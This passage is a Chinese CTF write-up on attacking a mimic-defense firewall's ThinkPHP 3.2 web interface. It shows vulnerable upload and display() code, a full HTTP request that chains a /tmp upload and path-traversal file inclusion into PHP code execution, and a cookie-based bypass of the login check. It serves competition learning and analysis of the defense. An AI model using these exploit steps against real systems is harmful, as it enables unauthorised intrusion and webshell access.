wp 。
由于去年我研究的时候已经是赛后了，所以我并没有实际测试过，时至今日，我也不能肯定今年和去年是不是同一份代码。不过这不影响我们可以简单了解架构。
然后仔细阅读代码，代码结构为 Thinkphp3.2 架构，其中部分代码和远端不一致，所以只能尝试攻击。
在3.2中，Thinkphp 有一些危险函数操作，比如 display，display 可以直接将文件include
进来，如果函数参数可控，我们又能上传文件，那么我们就可以 getshell。
全局审计代码之后我们发现在`/application/home/Controller/CommonControler.class.php`
如果我们能让 type 返回为 html ，就可以控制 display 函数。
搜索 type 可得`$this->getAcceptType();`
     $type = array(
                'json'  =>  'application/json,text/x-json,application/jsonrequest,text/json',
                'xml'   =>  'application/xml,text/xml,application/x-xml',
                'html'  =>  'text/html,application/xhtml+xml,*/*',
                'js'    =>  'text/javascript,application/javascript,application/x-javascript',
                'css'   =>  'text/css',
                'rss'   =>  'application/rss+xml',
                'yaml'  =>  'application/x-yaml,text/yaml',
                'atom'  =>  'application/atom+xml',
                'pdf'   =>  'application/pdf',
                'text'  =>  'text/plain',
                'png'   =>  'image/png',
                'jpg'   =>  'image/jpg,image/jpeg,image/pjpeg',
                'gif'   =>  'image/gif',
                'csv'   =>  'text/csv'
            );
只要将请求头中的 accept 设置好就可以了。
然后我们需要找一个文件上传，在`UserController.class.php moduleImport函数里`
        } else {
               $config['param']['filename']=$_FILES["file"]["name"];
                $newfilename="./tmp/".$_FILES["file"]["name"];
                if($_POST['hid_import_file_type']) $config['param']['file-format'] = formatpost($_POST['hid_import_file_type']);
                if($_POST['hid_import_loc']!='') $config['param']['group'] = formatpost($_POST['hid_import_loc']);
                if($_POST['hid_import_more_user']) $config['param']['type'] = formatpost($_POST['hid_import_more_user']);
                if($_POST['hid_import_login_addr']!='')$config['param']['address-name'] = formatpost($_POST['hid_import_login_addr']);
                if($_POST['hid_import_login_time']!='') $config['param']['timer-name'] = formatpost($_POST['hid_import_login_time']);
                if($_POST['hid_import_login_area']!='') $config['param']['area-name'] = formatpost($_POST['hid_import_login_area']);
                if($_POST['hid_import_cognominal']) $config['param']['cognominal'] = formatpost($_POST['hid_import_cognominal']);
                //判断当前文件存储路径中是否含有非法字符
                if(preg_match('/\.\./',$newfilename)){
                    exit('上传文件中不能存在".."等字符');
                }
                var_dump($newfilename);
                if(move_uploaded_file($_FILES["file"]["tmp_name"],$newfilename)) {
                    echo sendRequestSingle($config);
                } else
                    $this->display('Default/auth_user_manage');
            }
         }
这里的上传只能传到`/tmp`目录下，而且不可以跨目录，所以我们直接传文件上去。
紧接着然后使用之前的文件包含直接包含该文件
    GET /?c=Auth/User&a=index&assign=0&w=../../../../../../../../tmp/index1&ddog=var_dump(scandir('/usr/local/apache2/htdocs')); HTTP/1.1
    Host: 172.29.118.2
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
    Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: PHPSESSID=spk6s3apvh5c54tj9ch052fp53; think_language=zh-CN
    Upgrade-Insecure-Requests: 1
上传文件的时候要注意 seesion 和 token ，token 可以从首页登陆页面获得。
至此我们成功获得了 webshell 。这里拿到 webshell 之后就会进入一段神奇的发现。
首先，服务端除了`/usr`以外没有任何的目录，其中`/usr/`中除了3个服务端，也没有任何多余的东西。换言之就是没有`/bin`，也就是说并没有一个linux的基本环境，这里我把他理解为执行体，在他的外层还有别的代码来联通别的执行体。
由于没有`/bin`，导致服务端不能执行system函数，这大大影响了我的攻击效率，这可能也是我被反超的一个原因...
继续使用php eval shell，我们发现后端3个执行体分别为nginx\apache\lighthttpd，实际上来说都是在同一个文件夹下
    /usr/local/apache2/htdocs
    /usr/local/nginx/htdocs
    /usr/local/lighttpd/htdocs
由于 Web
的服务器可以随便攻击，有趣的是，在未知情况下，服务端会被重置，但神奇的是，一次一般只会重置3个服务端的一部分，这里也没有拟态裁决的判定，只要单纯的刷新就可以进入不同的后端，其感觉就好像是负载均衡一样。
这样我不禁怀疑起服务端的完成方式，大概像裁决机是被设定拼接在某个部分之前的，其裁决的内容也有所设定，到这里我们暂时把服务端架构更换。
# 阅读服务端代码
在拿到 shell 之后，主办方强调 Web 服务和题目无关，需要修改后端的访问控制权限，由于本地的代码和远程差异太大，所以首先要拿到远端的代码。
从`/conf/menu.php`中可以获得相应功能的路由表。
    ...
    'policy' => array(
        'text' => L('SECURE_POLICY'),
        'childs' => array(
            //访问控制
            'firewall' => array(
                'text' => L('ACCESS_CONTROL'),
                'url' => '?c=Policy/Interview&a=control_show',
                'img' => '28',
                'childs' => ''
            ),
            //地址转换
            'nat' => array(
                'text' => L('NAT'),
                'url' => '',
                'img' => '2',
                'childs' => array(
                    'nat' => array(
                        'text' => 'NAT',
                        'url' => '?c=Policy/Nat&a=nat_show'
                    ),
其中设置防火墙访问控制权限的路由为`?c=Policy/Interview&a=control_show',`
然后直接读远端的代码`/Controller/Policy/interviewController.class.php`
其操作相关为
    //添加策略
    public function interviewAdd() {
        if (getPrivilege("firewall") == 1) {
            if($_POST['action1']!='')  $param['action'] = formatpost($_POST['action1']);
            if($_POST['enable']!='')  $param['enable'] = formatpost($_POST['enable']);
            if($_POST['log1']!='')  $param['log'] = formatpost($_POST['log1']);
            if($_POST['srcarea']!='')  $param['srcarea'] = '\''.formatpost($_POST['srcarea'],false).'\'';
            if($_POST['dstarea']!='')  $param['dstarea'] = '\''.formatpost($_POST['dstarea'],false).'\'';
            /*域名*/
直接访问这个路由发现权限不够，跟入`getPrivilege`
    /**
     * 获取权限模板，$module是否有权限
     * @param string $module
     * @return int 1:有读写权限，2：读权限，0:没权限
     */
    function getPrivilege($module) {
        if (!checkLogined()) {
            header('location:' . $_COOKIE['urlorg']);
        }
        return ngtos_ipc_privilege(NGTOS_MNGT_CFGD_PORT, M_TYPE_WEBUI, REQ_TYPE_AUTH, AUTH_ID, NGTOS_MNGT_IPC_NOWAIT, $module);
    }
一直跟到 checklogin
    校验url合法性，是否真实登录
    function checkLogined() {
        //获得cookie中的key
        $key = $_COOKIE['loginkey'];
    //        debugFile($key);
        //获得url请求中的authid
    //    $authid = $_GET['authid'];
    //        debugFile($authid);
        //检查session中是否存在改authid和key
        if (!empty($key) && $key == $_SESSION['auth_id'][AUTH_ID]) {
            return true;
        } else {
            return false;
        }
    }
    /*
发现对 cookie 中的 loginkey 操作直接对比了 auth_id ，id 值直接盲猜为1，于是绕过权限控制
添加相应的 cookie ，就可以直接操作访问控制页面的所有操作，但是后端有拟态防御，所以访问 500.
至此，我无意中触发了拟态扰动...这完全是在我心理预期之外的触发，在我的理解中，我以为是我的参数配置错误，或者是这个 api
还需要添加策略组，然后再修改。由于我无法肯定问题出在了哪，所以我一直试图想要看到这个策略修改页面，并正在为之努力。（我认为我应该是在正常的操作功能，不会触发拟态扰动...）
ps：这里膜@zsx和@超威蓝猫，因为我无法加载 jquery ，所以我看不到那个修改配置的页面是什么样的，但 ROIS 直接用 js
获取页面内容渲染...
在仔细分析拟态的原理之后，我觉得如果这个功能可以被正常修改（在不被拟态拦截的情况下），那么我们就肯定触发了所有的执行体（不可能只影响其中一台）。
那么我们反向思考过来，既然无法修改，就说明这个配置在裁决机背设置为白名单了，一旦修改就会直接拦截并返回 500！
所以我们当时重新思考了拟态防火墙的结构...我们发现，因为Web服务作为防火墙的管理端，在防火墙的配置中，至少应该有裁决机的 ip
，搞不好可以直接获取防火墙的 ip 。
这时候如果我们直接向后端ip构造socket请求，那么我们就能造成一次 **降维打击** 。
只是可惜，因为没有 system shell
，再加上不知道为什么蚁剑和菜刀有问题，我们只能花时间一个一个文件去翻，结果就是花了大量的时间还没找到(远程的那份代码和我本地差异太大了)，赛后想来，如果当场写一个脚本说不定就保住第一了2333
# 关于拟态
在几次和拟态防御的较量中，拟态防御现在的形态模式也逐渐清晰了起来，从最开始的测信道攻击、ddos攻击无法防御，以及关键的业务落地代价太大问题。逐渐到业务逻辑漏洞的防御缺陷。
拟态防御本身的问题越来越清晰起来，其最关键的业务落地代价太大问题，在现在的拟态防御中，逐渐使用放弃一些安全压力的方式来缓解，现在的拟态防御更针对倾向于组件级安全问题的防御。假设在部分高防需求场景下，拟态作为安全生态的一环，如果可以通过配置的方式，将拟态与传统的Waf、防火墙的手段相结合，不得不承认，在一定程度上，拟态的确放大了安全防御中的一部分短板。拟态防御的后续发展怎么走，还是挺令人期待的。
* * *